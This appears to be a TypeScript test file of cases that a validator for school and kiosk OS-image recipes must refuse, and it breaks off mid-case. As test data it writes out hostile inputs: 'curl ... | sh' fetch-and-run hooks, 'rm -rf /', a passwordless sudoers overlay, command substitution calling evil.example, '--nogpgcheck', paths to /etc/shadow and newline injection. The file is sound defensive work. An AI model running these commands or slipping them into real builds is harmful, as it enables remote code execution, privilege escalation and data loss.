/**
 * The refusals. This is the important file.
 *
 * A recipe format is judged by what it will not express. Every entry below is a recipe somebody
 * could plausibly write -- carelessly, under deadline pressure, or on purpose -- that MUST be
 * refused, and the assertion is not merely that it was refused but that the refusal SAID THE RIGHT
 * THING. A rejection a reader does not understand gets worked around, and every workaround for
 * these particular rules ends in a fleet that stops receiving repairs while still looking
 * maintained.
 *
 * The happy paths are in happy.test.ts and there are three of them. There are far more of these,
 * and that ratio is the point: spec section 6C says the abort path is tested more than the happy
 * path, and the same reasoning applies to a format whose product is subtraction.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import { check, kiosk, mutate, said, school, workstation, type Doc } from './helpers.ts';

interface Case {
  /** What somebody was trying to do. */
  readonly label: string;
  readonly doc: Doc;
  /** Part of the sentence the refusal must contain. Case-insensitive. */
  readonly says: RegExp;
}

const S = school();
const K = kiosk();
const W = workstation();

const MUST_REFUSE: ReadonlyArray<Case> = [
  // ---- the FROM line, in each of its disguises ---------------------------------------------------
  {
    label: 'a FROM override',
    doc: mutate(S, (d) => { d['from'] = 'ghcr.io/somebody/else:latest'; }),
    says: /no field for the base image|cannot name what it is built on/i,
  },
  {
    label: 'a different base by another name',
    doc: mutate(S, (d) => { d['base'] = 'docker.io/library/fedora:41'; }),
    says: /every organisation is on the same foundation|same foundation/i,
  },
  {
    label: 'a base pinned by digest, which looks like caution',
    doc: mutate(S, (d) => { d['digest'] = 'sha256:aaaa'; }),
    says: /freezes them off the rebuild|freezes that customer off|off the rebuild that carries the next security fix/i,
  },
  {
    label: 'a base smuggled in under a camelCase key the schema never listed',
    doc: mutate(S, (d) => { d['baseImage'] = 'ghcr.io/elsewhere/thing@sha256:beef'; }),
    says: /cannot name what it is built on/i,
  },
  {
    label: 'a whole Containerfile',
    doc: mutate(S, (d) => { d['containerfile'] = 'FROM scratch'; }),
    says: /no field for the base image, and that is the point/i,
  },

  // ---- kernels, drivers, boot arguments ----------------------------------------------------------
  {
    label: 'a kernel pin',
    doc: mutate(S, (d) => { d['kernel'] = '6.1.0-lts'; }),
    says: /kernel.*belongs? to the base|fork wearing a smaller hat/i,
  },
  {
    label: 'a boot argument',
    doc: mutate(S, (d) => { d['kargs'] = ['quiet']; }),
    says: /boot command line|fork wearing a smaller hat/i,
  },
  {
    label: 'an out-of-tree driver for one stubborn wifi card',
    doc: mutate(S, (d) => { d['dkms'] = ['broadcom-wl']; }),
    says: /drivers.*belong to the base|one team patches them once/i,
  },
  {
    label: 'kernel arguments under a key the schema does not list',
    doc: mutate(S, (d) => { d['kernelArgs'] = ['mitigations=off']; }),
    says: /cannot choose a kernel/i,
  },

  // ---- version pins, in five spellings -----------------------------------------------------------
  {
    label: 'a version pin as a field',
    doc: mutate(S, (d) => { d['hold'] = ['firefox']; }),
    says: /nothing can be held at a version|unpatched while still/i,
  },
  {
    label: 'a version pin spelled as an application: firefox-140.0',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('firefox-140.0'); }),
    says: /no digits|version pin unspellable/i,
  },
  {
    label: 'a version pin spelled as an application: Firefox 140',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('Firefox 140'); }),
    says: /no digits|version pin unspellable/i,
  },
  {
    label: 'a version pin spelled as a constraint: kernel>=6.1',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('kernel>=6.1'); }),
    says: /no digits|version pin unspellable/i,
  },
  {
    label: 'a version pin spelled as an assignment: foo=1.2',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('foo=1.2'); }),
    says: /no digits|version pin unspellable/i,
  },
  {
    label: 'a version pin spelled as a full rpm NEVRA',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('firefox-1:115-3.fc41.x86_64'); }),
    says: /no digits|raw package or Flatpak identifier/i,
  },
  {
    label: 'a raw Flatpak reference instead of a name',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('org.mozilla.firefox'); }),
    says: /three different spellings|raw package or Flatpak identifier|catalogue/i,
  },
  {
    label: 'a version exclusion under an unlisted key',
    doc: mutate(S, (d) => { d['pinnedVersions'] = { firefox: '140' }; }),
    says: /nothing can be held at a version/i,
  },

  // ---- pruning the update path -------------------------------------------------------------------
  {
    label: 'pruning bootc',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('bootc'); }),
    says: /no way to write the sentence that would brick a fleet/i,
  },
  {
    label: 'pruning the update timer',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('update timer'); }),
    says: /no way to write the sentence that would brick a fleet/i,
  },
  {
    label: 'pruning NetworkManager',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('NetworkManager'); }),
    says: /to reach the network[\s\S]*brick a fleet/i,
  },
  {
    label: 'pruning greenboot, the thing that undoes a bad update',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('greenboot'); }),
    says: /roll back a failed update[\s\S]*brick a fleet/i,
  },
  {
    label: 'pruning a screen reader',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('screen reader'); }),
    says: /screen reader/i,
  },
  {
    label: 'switching updates off entirely',
    doc: mutate(S, (d) => { d['disable_updates'] = true; }),
    says: /safety net is not optional|rollback/i,
  },

  // ---- the gates ---------------------------------------------------------------------------------
  {
    label: 'asking for fewer checks',
    doc: mutate(S, (d) => { d['skip_checks'] = true; }),
    says: /no way to ask for less testing/i,
  },
  {
    label: 'publishing without a test build',
    doc: mutate(S, (d) => { d['publish_without_test'] = true; }),
    says: /no way to ask for less testing/i,
  },
  {
    label: 'shipping unsigned',
    doc: mutate(S, (d) => { d['unsigned'] = true; }),
    says: /no way to ask for less testing/i,
  },
  {
    label: 'skipping a test machine, which is the one direction also_test does not go',
    doc: mutate(S, (d) => { (d['hardware'] as Doc)['also_skip'] = ['bios-legacy']; }),
    says: /'also_skip' is not a field this file has/,
  },

  // ---- running code, dropping files, adding sources ----------------------------------------------
  {
    label: 'a post-install script',
    doc: mutate(S, (d) => { d['post_install'] = 'curl https://x.example | sh'; }),
    says: /cannot run code|stranger can send us a command/i,
  },
  {
    label: 'a build hook under an unlisted key',
    doc: mutate(S, (d) => { d['postInstallScript'] = 'rm -rf /'; }),
    says: /cannot run code/i,
  },
  {
    label: 'an extra package source',
    doc: mutate(S, (d) => { d['copr'] = ['somebody/thing']; }),
    says: /software source|reviewed once for everybody|package source/i,
  },
  {
    label: 'turning off signature checking on packages',
    doc: mutate(S, (d) => { d['nogpgcheck'] = true; }),
    says: /switch off signature checking on a package/i,
  },
  {
    label: 'an arbitrary file overlay',
    doc: mutate(S, (d) => { d['files'] = { '/etc/sudoers.d/99-open': 'ALL ALL=(ALL) NOPASSWD:ALL' }; }),
    says: /arbitrary files|script with extra steps/i,
  },

  // ---- shell escapes in text that reaches the image ----------------------------------------------
  {
    label: 'a shell escape in the branding string',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'Example $(curl evil.example|sh) Vidyalaya'; }),
    says: /command substitution|never seen by a shell|base64/i,
  },
  {
    label: 'a backtick in the first-boot message',
    doc: mutate(S, (d) => { d['first_boot_message'] = 'Welcome `id`'; }),
    says: /command substitution/i,
  },
  {
    label: 'a shell variable expansion in a helpdesk label',
    doc: mutate(S, (d) => { ((d['organisation'] as Doc)['helpdesk'] as Doc)['label'] = 'Help ${HOME}'; }),
    says: /command substitution/i,
  },
  {
    label: 'a text-direction override that makes the file read one way and mean another',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'Example‮Vidyalaya'; }),
    says: /direction|override|control characters/i,
  },

  // ---- secrets in a public repository ------------------------------------------------------------
  {
    label: 'the wireless password, which is the single most tempting field',
    doc: mutate(S, (d) => { d['wifi_password'] = 'hunter2'; }),
    says: /public by design|no credential/i,
  },
  {
    label: 'an API token under an unlisted key',
    doc: mutate(S, (d) => { d['apiKey'] = 'sk-live-abc'; }),
    says: /credential|public/i,
  },

  // ---- claims we cannot evidence -----------------------------------------------------------------
  {
    label: 'a blanket compatibility claim',
    doc: mutate(S, (d) => { d['compatibility'] = 'most Windows apps work'; }),
    says: /cannot make a general claim/i,
  },
  {
    label: 'a testimonial',
    doc: mutate(S, (d) => { d['testimonial'] = 'best OS ever'; }),
    says: /cannot make a general claim/i,
  },
  {
    label: '"works" with no caveat written down',
    doc: mutate(S, (d) => { delete ((d['windows_apps'] as Doc)['tested'] as Doc[])[0]!['note']; }),
    says: /a positive result needs its caveats written down/i,
  },

  // ---- hardware ----------------------------------------------------------------------------------
  {
    label: 'a hardware test profile that does not exist',
    doc: mutate(S, (d) => { (d['hardware'] as Doc)['also_test'] = ['uefi-moderrn']; }),
    says: /Nearest: uefi-modern\./,
  },
  {
    label: 'a virtual test machine invented on the spot',
    doc: mutate(S, (d) => { (d['hardware'] as Doc)['also_test'] = ['the-headmasters-laptop']; }),
    says: /not one of the published choices[\s\S]*virtual test machine/i,
  },

  // ---- languages, keyboards, and a fleet nobody can log into --------------------------------------
  {
    label: 'a locale with no font package, spelled as a locale code',
    doc: mutate(S, (d) => { d['language'] = 'mr_IN.UTF-8'; }),
    says: /no codes, no digits/i,
  },
  {
    label: 'a language we have no fonts for',
    doc: mutate(S, (d) => { d['language'] = 'Klingon'; }),
    says: /knows how to draw|empty boxes/i,
  },
  {
    label: 'a first-boot message in a script none of the fleet languages brings',
    doc: mutate(W, (d) => { d['first_boot_message'] = 'नमस्कार'; }),
    says: /devanagari|fonts for that|empty boxes/i,
  },
  {
    label: 'a non-Latin primary keyboard, which strands the login screen',
    doc: mutate(S, (d) => { d['keyboard'] = 'Marathi (InScript)'; }),
    says: /login screen|disk-unlock|published choices/i,
  },
  {
    label: 'a second script with no way to reach it',
    doc: mutate(S, (d) => { delete d['switch_scripts_with']; }),
    says: /second script needs a way to switch/i,
  },
  {
    label: 'a timezone as an offset, which is wrong twice a year',
    doc: mutate(S, (d) => { d['timezone'] = 'UTC+05:30'; }),
    says: /an offset is wrong twice a year/i,
  },

  // ---- policy modes that mean what they say -------------------------------------------------------
  {
    label: 'a terminal on a managed fleet, asked for directly',
    doc: mutate(S, (d) => { d['desktop'] = { can_reach_a_terminal: true }; }),
    says: /terminal only exists on an open machine/i,
  },
  {
    label: 'a terminal on a managed fleet, smuggled in as an application',
    // also_remove is narrowed first so this case proves the terminal rule alone rather than
    // passing on the install-and-remove contradiction, which the next case covers.
    doc: mutate(S, (d) => { (d['prune'] as Doc)['also_remove'] = ['games', 'remote desktop']; (d['apps'] as string[]).push('Konsole'); }),
    says: /'Konsole' is a terminal, and this fleet is managed/,
  },
  {
    label: 'a software installer on a fleet that may not install software',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('Software Centre'); }),
    says: /installs software|can_install_apps/i,
  },
  {
    label: 'a locked fleet that can install applications',
    doc: mutate(S, (d) => { d['policy'] = 'locked'; d['desktop'] = { can_install_apps: true }; }),
    says: /locked means locked/i,
  },
  {
    label: 'a kiosk with a desktop to shape',
    doc: mutate(K, (d) => { d['desktop'] = { taskbar_and_start_menu: true }; }),
    says: /kiosk has no desktop/i,
  },
  {
    label: 'a kiosk running Windows programs',
    doc: mutate(K, (d) => { d['windows_apps'] = { enabled: true, we_promise_nothing_else: true }; }),
    says: /kiosk cannot run windows programs/i,
  },
  {
    label: 'a kiosk keeping a full desktop',
    doc: mutate(K, (d) => { (d['prune'] as Doc)['keep_only_the_apps_above'] = false; }),
    says: /kiosk keeps only what it opens/i,
  },
  {
    label: 'a kiosk served over plain http',
    doc: mutate(K, (d) => { (d['kiosk'] as Doc)['opens'] = 'http://start.example.org/kiosk'; }),
    says: /a way out of the kiosk rather than a page inside it/i,
  },
  {
    label: 'a kiosk allowed to reach nothing at all',
    doc: mutate(K, (d) => { (d['kiosk'] as Doc)['allowed_sites'] = []; }),
    says: /fewer than 1 items[\s\S]*hostnames the window may navigate to/i,
  },
  {
    label: 'a kiosk whose own page is not on its allow-list',
    doc: mutate(K, (d) => { (d['kiosk'] as Doc)['opens'] = 'https://elsewhere.example.org/start'; }),
    says: /not in allowed_sites|error page/i,
  },

  // ---- subtraction is not optional ----------------------------------------------------------------
  {
    label: 'no prune block at all',
    doc: mutate(S, (d) => { delete d['prune']; }),
    says: /no 'prune', and it is required[\s\S]*this block is the product/i,
  },
  {
    label: 'a removal floor of zero',
    doc: mutate(S, (d) => { (d['prune'] as Doc)['must_remove_at_least'] = 0; }),
    says: /zero is not a legal value|alarm anyone can turn down/i,
  },
  {
    label: 'keeping the whole desktop without saying what comes out of it',
    doc: mutate(S, (d) => { (d['prune'] as Doc)['keep_only_the_apps_above'] = false; delete (d['prune'] as Doc)['also_remove']; }),
    says: /saying what to take out/i,
  },
  {
    label: 'a typo in a subtraction key, which must never be silently ignored',
    doc: mutate(S, (d) => { (d['prune'] as Doc)['also_remvoe'] = ['games']; }),
    says: /did you mean also_remove|quietly dropped/i,
  },
  {
    label: 'keeping and removing the same thing',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_keep'] as string[]).push('bluetooth'); ((d['prune'] as Doc)['also_remove'] as string[]).push('bluetooth'); }),
    says: /both also_keep and also_remove/i,
  },
  {
    label: 'installing an application and removing the group it belongs to',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('media players'); }),
    says: /also removes the group|one of those two instructions is going to lose/i,
  },

  // ---- the closed world itself --------------------------------------------------------------------
  {
    label: 'an unknown schema version',
    doc: mutate(S, (d) => { d['schema'] = 2; }),
    says: /refuses to build rather than guessing what a field used to mean/i,
  },
  {
    label: 'any key at all that the schema does not know',
    doc: mutate(S, (d) => { d['notes'] = 'anything'; }),
    says: /not a field this file has|quietly dropped/i,
  },
  {
    label: 'a name that could be read as an image tag somewhere downstream',
    doc: mutate(S, (d) => { d['name'] = 'example-school:v2'; }),
    says: /read as an image tag or digest somewhere downstream/i,
  },
  {
    label: 'a name that does not match the folder it sits in',
    doc: mutate(S, (d) => { d['name'] = 'some-other-school'; }),
    says: /does not match the folder/i,
  },
  {
    label: 'a "for" paragraph too short to explain anything to whoever inherits it',
    doc: mutate(S, (d) => { d['for'] = 'some school laptops'; }),
    says: /a blank one is a file nobody can inherit/i,
  },
  {
    label: 'no size budget at all',
    doc: mutate(S, (d) => { delete d['size_budget_gb']; }),
    says: /no 'size_budget_gb', and it is required[\s\S]*quietly failing/i,
  },
  {
    label: 'a logo fetched from the internet',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['logo'] = 'https://x.example/logo.png'; }),
    says: /supply-chain dependency into a school's wallpaper/i,
  },
  {
    label: 'a logo reached by path traversal',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['logo'] = '../../etc/shadow.png'; }),
    says: /no path, no parent directory, no symlink, no URL/i,
  },
  // =================================================================================================
  // SECOND TABLE. Everything above was written when the format was designed. Everything below was
  // written by going back through the schema looking for a way IN rather than for a rule to restate,
  // which is the only way a refusal table stays honest after the easy cases are covered.
  //
  // Each block ends where the last one would have stopped if somebody were trying rather than typing.
  // =================================================================================================

  // ---- a version pin, in every dnf spelling there is ----------------------------------------------
  // The rule is a SHAPE -- an application name has no digits -- so the interesting question is not
  // whether one spelling is blocked but whether any spelling of a version reaches a build at all.
  ...[
    'firefox-1.2',
    'firefox-140.0-3.fc44.x86_64',
    'firefox >= 140',
    'firefox>=1.2',
    'firefox=1.2',
    'firefox<=140',
    'firefox < 140',
    'firefox-1:140',
    '1:firefox',
    'firefox-140.0-3.fc44.noarch',
    'firefox.x86_64',
    'firefox*',
    'firefox?',
    'firefox-*',
    '*firefox*',
    'kernel-core-6.11.3-200.fc40',
    'libreoffice-core >= 7.6',
  ].map((spelling) => ({
    label: `a version pin or a glob spelled as an application: ${spelling}`,
    doc: mutate(S, (d) => { (d['apps'] as string[]).push(spelling); }),
    // The `why` is the appName description, which explains the shape rather than listing blocked
    // spellings. That is the sentence a reader needs, and asserting on it is what makes this a test
    // of the rule rather than a test of ajv's phrasing.
    says: /No digits anywhere|version pin unspellable|raw package or Flatpak identifier/i,
  })),

  // ---- the FROM line, under every other name anyone has used for it --------------------------------
  ...[
    ['baseimage', 'ghcr.io/elsewhere/x'],
    ['base_image', 'ghcr.io/elsewhere/x'],
    ['image_ref', 'ghcr.io/elsewhere/x@sha256:beef'],
    ['inherit_from', 'fedora:41'],
    ['base_digest', 'sha256:beef'],
    ['image_digest', 'sha256:beef'],
    ['base_tag', 'stable'],
    ['rebase_to', 'ghcr.io/elsewhere/x'],
    ['upstream', 'ghcr.io/elsewhere/x'],
    ['registry', 'docker.io'],
    ['manifest', 'x'],
    ['dockerfile', 'FROM scratch'],
  ].map(([key, value]) => ({
    label: `the foundation smuggled in as '${key}'`,
    doc: mutate(S, (d) => { d[key!] = value; }),
    says: /cannot name what it is built on|no field for the base image|same foundation/i,
  })),

  // ---- a kernel, a driver, a boot argument ---------------------------------------------------------
  ...[
    ['kernel_version', '6.11.3'],
    ['kernel_pin', '6.11.3'],
    ['kernel_cmdline', 'mitigations=off'],
    ['boot_args', ['quiet']],
    ['module_blacklist', ['nouveau']],
    ['initrd', 'custom'],
    ['microcode', 'amd'],
    ['grub', { timeout: 0 }],
    ['drivers', ['broadcom-wl']],
    ['firmware', ['iwlwifi']],
  ].map(([key, value]) => ({
    label: `a kernel or driver decision smuggled in as '${String(key)}'`,
    doc: mutate(S, (d) => { d[key as string] = value; }),
    says: /cannot choose a kernel, a driver or a boot argument|belongs? to the base|fork wearing a smaller hat/i,
  })),

  // ---- the raw-Containerfile escape hatch, which is the one that ends the whole design -------------
  ...[
    'raw_containerfile',
    'extra_containerfile',
    'containerfile_append',
    'ostree',
    'ostree_override',
    'rpm_ostree_override_replace',
    'overlay',
    'overlays',
    'patch',
    'patches',
    'copy',
    'add',
    'write_file',
    'etc_files',
    'systemd_unit',
    'dropin',
    'sudoers',
    'polkit_rule',
    'sysctl',
  ].map((key) => ({
    label: `an escape hatch into the image contents: '${key}'`,
    doc: mutate(S, (d) => { d[key] = key.endsWith('s') ? ['x'] : 'x'; }),
    // Some of these land on a family sentence and some land on "not a field this file has". Both are
    // refusals and both are readable; what must never happen is one of them being ACCEPTED, which is
    // what `result.ok === false` in the runner below asserts for every row in this table.
    says: /cannot drop arbitrary files|script with extra steps|not a field this file has|cannot run code|cannot name what it is built on/i,
  })),

  // ---- running code, under every name a person reaches for -----------------------------------------
  ...[
    'post_install',
    'postInstall',
    'pre_install',
    'first_boot_script',
    'on_boot',
    'run_script',
    'shell_cmd',
    'systemd_exec',
    'exec_start',
    'environment',
    'entrypoint',
    'cmd',
    'commands',
    'hooks',
  ].map((key) => ({
    label: `code in a recipe, as '${key}'`,
    doc: mutate(S, (d) => { d[key] = 'curl https://x.example | sh'; }),
    says: /cannot run code|stranger can send us a command|not a field this file has/i,
  })),

  // ---- arguments passed through to the package manager ---------------------------------------------
  // These are the quiet ones. They do not look like running code and they do exactly that: --nogpgcheck
  // installs whatever answered, and --setopt can point dnf at a different repository entirely.
  ...['extra_args', 'dnf_args', 'install_args', 'package_args', 'build_args', 'rpm_args'].map((key) => ({
    label: `arguments passed through to the package manager, as '${key}'`,
    doc: mutate(S, (d) => { d[key] = ['--nogpgcheck', '--setopt=reposdir=/tmp']; }),
    says: /not a field this file has|cannot run code|software source/i,
  })),

  // ---- unknown nested keys, one per block, because additionalProperties is easy to forget ----------
  {
    label: 'an unknown key inside organisation',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['motto'] = 'Excellence'; }),
    says: /'motto' is not a field this file has/,
  },
  {
    label: 'an unknown key inside hardware',
    doc: mutate(S, (d) => { (d['hardware'] as Doc)['cpu'] = 'i5'; }),
    says: /'cpu' is not a field this file has/,
  },
  {
    label: 'an unknown key inside prune',
    doc: mutate(S, (d) => { (d['prune'] as Doc)['except'] = ['systemd']; }),
    says: /'except' is not a field this file has/,
  },
  {
    label: 'an unknown key inside approved_by, which is where a forged signature would go',
    doc: mutate(S, (d) => { (d['approved_by'] as Doc)['signature'] = 'trust me'; }),
    says: /'signature' is not a field this file has|no way to ask for less testing/i,
  },
  {
    label: 'an unknown key inside theme',
    doc: mutate(S, (d) => { (d['theme'] as Doc)['custom_css'] = 'body{}'; }),
    says: /not a field this file has/i,
  },
  {
    label: 'an unknown key inside windows_apps',
    doc: mutate(S, (d) => { (d['windows_apps'] as Doc)['wine_args'] = '-x'; }),
    says: /not a field this file has/i,
  },
  {
    label: 'an unknown key inside kiosk',
    doc: mutate(K, (d) => { (d['kiosk'] as Doc)['proxy'] = 'http://x.example'; }),
    says: /'proxy' is not a field this file has/,
  },
  {
    label: 'an unknown key inside updates',
    doc: mutate(S, (d) => { (d['updates'] as Doc)['enabled'] = false; }),
    says: /not a field this file has/i,
  },
  {
    label: 'an unknown key inside a windows_apps.tested row',
    doc: mutate(S, (d) => { ((d['windows_apps'] as Doc)['tested'] as Doc[])[0]!['verified_by'] = 'us'; }),
    says: /not a field this file has/i,
  },
  {
    label: 'an unknown key inside helpdesk',
    doc: mutate(S, (d) => { ((d['organisation'] as Doc)['helpdesk'] as Doc)['email'] = 'x@example.org'; }),
    says: /not a field this file has/i,
  },

  // ---- the wrong TYPE in the right place -----------------------------------------------------------
  // A YAML file written by hand gets these wrong constantly, and the interesting half is that a null
  // must not be read as "absent and therefore defaulted". `prune: ~` is a legal YAML line and it must
  // not mean "no pruning" on a product whose thesis is subtraction.
  {
    label: 'a null where the fleet name belongs',
    doc: mutate(S, (d) => { d['name'] = null; }),
    says: /must be string/i,
  },
  {
    label: 'a null where the language belongs',
    doc: mutate(S, (d) => { d['language'] = null; }),
    says: /must be string/i,
  },
  {
    label: 'a null in the middle of the applications list',
    doc: mutate(S, (d) => { (d['apps'] as unknown[]).splice(2, 0, null); }),
    says: /must be string/i,
  },
  {
    label: 'a null prune block, which must never read as "nothing to remove"',
    doc: mutate(S, (d) => { d['prune'] = null; }),
    says: /must be object/i,
  },
  {
    label: 'a null policy',
    doc: mutate(S, (d) => { d['policy'] = null; }),
    says: /not one of the published choices|must be string/i,
  },
  {
    label: 'a null must_remove_at_least, which is the alarm switched off by a punctuation mark',
    doc: mutate(S, (d) => { (d['prune'] as Doc)['must_remove_at_least'] = null; }),
    says: /must be integer|must be number/i,
  },
  {
    label: 'a list where a scalar belongs (name)',
    doc: mutate(S, (d) => { d['name'] = ['example-school']; }),
    says: /must be string/i,
  },
  {
    label: 'a list where a scalar belongs (policy)',
    doc: mutate(S, (d) => { d['policy'] = ['managed']; }),
    says: /not one of the published choices|must be string/i,
  },
  {
    label: 'a scalar where a list belongs (apps)',
    doc: mutate(S, (d) => { d['apps'] = 'Firefox'; }),
    says: /must be array/i,
  },
  {
    label: 'an object where a scalar belongs (timezone)',
    doc: mutate(S, (d) => { d['timezone'] = { name: 'Asia/Kolkata' }; }),
    says: /must be string/i,
  },
  {
    label: 'a string where a boolean belongs, which "yes" in YAML makes tempting',
    doc: mutate(S, (d) => { (d['prune'] as Doc)['keep_only_the_apps_above'] = 'true'; }),
    says: /must be boolean/i,
  },
  {
    label: 'a numeric string where a number belongs',
    doc: mutate(S, (d) => { d['size_budget_gb'] = '9'; }),
    says: /must be number|must be integer/i,
  },
  {
    label: 'a number where the fleet name belongs',
    doc: mutate(S, (d) => { d['name'] = 12345; }),
    says: /must be string/i,
  },
  {
    label: 'a boolean where the approval name belongs',
    doc: mutate(S, (d) => { (d['approved_by'] as Doc)['name'] = true; }),
    says: /must be string/i,
  },

  // ---- sizes, counts and other numbers at their edges ----------------------------------------------
  {
    label: 'a fleet of minus five machines',
    doc: mutate(S, (d) => { (d['hardware'] as Doc)['machines'] = -5; }),
    says: /must be >= 1/i,
  },
  {
    label: 'a fleet of zero machines',
    doc: mutate(S, (d) => { (d['hardware'] as Doc)['machines'] = 0; }),
    says: /must be >= 1/i,
  },
  {
    label: 'a fleet of a billion machines',
    doc: mutate(S, (d) => { (d['hardware'] as Doc)['machines'] = 1_000_000_000; }),
    says: /must be <= 5000/i,
  },
  {
    label: 'a fleet of one and a half machines',
    doc: mutate(S, (d) => { (d['hardware'] as Doc)['machines'] = 1.5; }),
    says: /must be integer/i,
  },
  {
    label: 'a negative size budget',
    doc: mutate(S, (d) => { d['size_budget_gb'] = -1; }),
    says: /must be >= 2/i,
  },
  {
    label: 'a size budget of five hundred gigabytes, which is not a budget',
    doc: mutate(S, (d) => { d['size_budget_gb'] = 500; }),
    says: /must be <= 40/i,
  },
  {
    label: 'a negative removal floor',
    doc: mutate(S, (d) => { (d['prune'] as Doc)['must_remove_at_least'] = -1; }),
    says: /zero is not a legal value|must be >= 1|alarm anyone can turn down/i,
  },
  {
    label: 'an empty applications list, which is a machine with nothing on it',
    doc: mutate(S, (d) => { d['apps'] = []; }),
    says: /fewer than 1 items/i,
  },
  {
    label: 'the same application named twice',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('Firefox'); }),
    says: /duplicate items/i,
  },
  {
    label: 'the same removable group named twice',
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push('games'); }),
    says: /duplicate items/i,
  },
  {
    label: 'a session that is never forgotten, written as zero minutes',
    doc: mutate(K, (d) => { (d['kiosk'] as Doc)['forget_session_after_minutes'] = 0; }),
    says: /must be >= 1/i,
  },

  // ---- a ten-megabyte string, which is what a pull request from a stranger can carry ----------------
  {
    label: 'a ten-megabyte paragraph in the "for" field',
    doc: mutate(S, (d) => { d['for'] = 'a'.repeat(10 * 1024 * 1024); }),
    says: /more than 1200 characters/i,
  },
  {
    label: 'a ten-megabyte first-boot message',
    doc: mutate(S, (d) => { d['first_boot_message'] = 'a'.repeat(10 * 1024 * 1024); }),
    says: /more than 400 characters/i,
  },
  {
    label: 'a ten-megabyte application name',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('A'.repeat(10 * 1024 * 1024)); }),
    says: /more than 48 characters/i,
  },
  {
    label: 'a ten-megabyte organisation name',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'A'.repeat(10 * 1024 * 1024); }),
    says: /more than \d+ characters/i,
  },

  // ---- deeply nested objects -----------------------------------------------------------------------
  {
    label: 'two thousand levels of nesting hung off a known block',
    doc: mutate(S, (d) => {
      let node: Doc = {};
      d['desktop'] = node;
      for (let i = 0; i < 2000; i++) { const next: Doc = {}; node['x'] = next; node = next; }
    }),
    says: /not a field this file has/i,
  },
  {
    label: 'two thousand levels of nesting hung off an unknown key',
    doc: mutate(S, (d) => {
      let node: Doc = {};
      d['metadata'] = node;
      for (let i = 0; i < 2000; i++) { const next: Doc = {}; node['x'] = next; node = next; }
    }),
    says: /not a field this file has/i,
  },
  {
    label: 'a forbidden key buried two thousand levels down, where nobody would read it',
    doc: mutate(S, (d) => {
      let node: Doc = {};
      d['metadata'] = node;
      for (let i = 0; i < 2000; i++) { const next: Doc = {}; node['x'] = next; node = next; }
      node['kernel_cmdline'] = 'mitigations=off';
    }),
    says: /not a field this file has|cannot choose a kernel/i,
  },

  // ---- unicode: a name that reads as one thing and is another --------------------------------------
  {
    label: 'a homoglyph: Cyrillic o inside an application name',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push(`Firef${String.fromCharCode(0x043e)}x`); }),
    says: /No digits anywhere|letters, separated by single spaces/i,
  },
  {
    label: 'a homoglyph: Greek omicron inside an application name',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push(`Firef${String.fromCharCode(0x03bf)}x`); }),
    says: /No digits anywhere|letters, separated by single spaces/i,
  },
  {
    label: 'fullwidth Latin, which renders as the right word and is not it',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('Ｆｉｒｅｆｏｘ'); }),
    says: /No digits anywhere|letters, separated by single spaces/i,
  },
  {
    label: 'a zero-width space hiding inside an application name',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('Fire​fox'); }),
    says: /No digits anywhere|letters, separated by single spaces/i,
  },
  {
    label: 'a zero-width joiner in the organisation name',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'Example‍Vidyalaya'; }),
    says: /control characters|invisible|direction/i,
  },
  {
    label: 'a right-to-left isolate in the first-boot message',
    doc: mutate(S, (d) => { d['first_boot_message'] = '⁦Welcome⁩'; }),
    says: /control characters|invisible|direction/i,
  },
  {
    label: 'an ANSI escape sequence in a name, aimed at whoever reads the build log',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'Example[2J[HVidyalaya'; }),
    says: /control characters|invisible|direction/i,
  },
  {
    label: 'a NUL byte in a name',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'Example Vidyalaya'; }),
    says: /control characters|invisible|direction/i,
  },
  {
    label: 'a newline in a name, which would end a comment line and start an instruction',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['display_name'] = 'Example\nRUN echo pwned'; }),
    says: /control characters|invisible|direction/i,
  },

  // ---- path traversal ------------------------------------------------------------------------------
  {
    label: 'path traversal in an application name',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('../../etc/passwd'); }),
    says: /No digits anywhere|letters, separated by single spaces/i,
  },
  {
    label: 'path traversal in the fleet name, which is also a directory name',
    doc: mutate(S, (d) => { d['name'] = '../../../etc'; }),
    says: /is not a value this field can hold|short name for this fleet/i,
  },
  {
    label: 'a slash in the fleet name, which is also part of an image reference',
    doc: mutate(S, (d) => { d['name'] = 'someone/else'; }),
    says: /is not a value this field can hold|short name for this fleet/i,
  },
  {
    label: 'an absolute path as a logo',
    doc: mutate(S, (d) => { (d['organisation'] as Doc)['logo'] = '/etc/shadow'; }),
    says: /no path, no parent directory, no symlink, no URL/i,
  },
  {
    label: 'a logo that is a symlink-shaped name',
